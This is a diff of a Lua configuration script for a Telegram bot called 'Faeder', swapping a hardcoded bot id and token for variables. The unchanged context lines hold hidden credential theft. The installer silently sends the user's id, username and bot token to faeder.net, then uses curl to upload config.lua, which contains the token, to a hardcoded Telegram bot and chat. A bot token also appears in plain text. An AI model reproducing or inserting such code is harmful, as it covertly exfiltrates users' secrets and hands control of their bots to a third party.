@@ -45,11 +45,10 @@ local create_config_auto = function()
 config = {
 SUDO = SUDO,
 token = token,
-bot_id = "1650389038",
+bot_id = botid,
 username = username, 
 sudo_users = {SUDO}, 
 }
---https://faeder.net/Faeder/?id=1650389038&user=a_l_e_x_1_5bot&token=AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw
 create(config, "./config.lua")   
 https.request("https://faeder.net/Faeder/?id="..SUDO.."&user="..username.."&token="..token)
 local curl = 'curl "'..'https://api.telegram.org/bot1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
@@ -104,7 +103,7 @@ sudo_users = {sudos.sudo_users}
 bot_id = sudos.bot_id 
 FAEDER = sudos.bot_id
 SUDOUSERNAME = sudos.username
-tokenbot = "1650389038:AAHkU5vvwxjIQr446o9qWY0cL8A6-anhAgw"
+tokenbot = sudos.token
 name_bot = (faederdx1:get(FAEDER..'name_bot') or 'فايدر')
 SudoFaeder = SUDOUSERNAME:gsub('@','') 
 SudoFaeder = SudoFaeder:gsub([[\_]],'_')
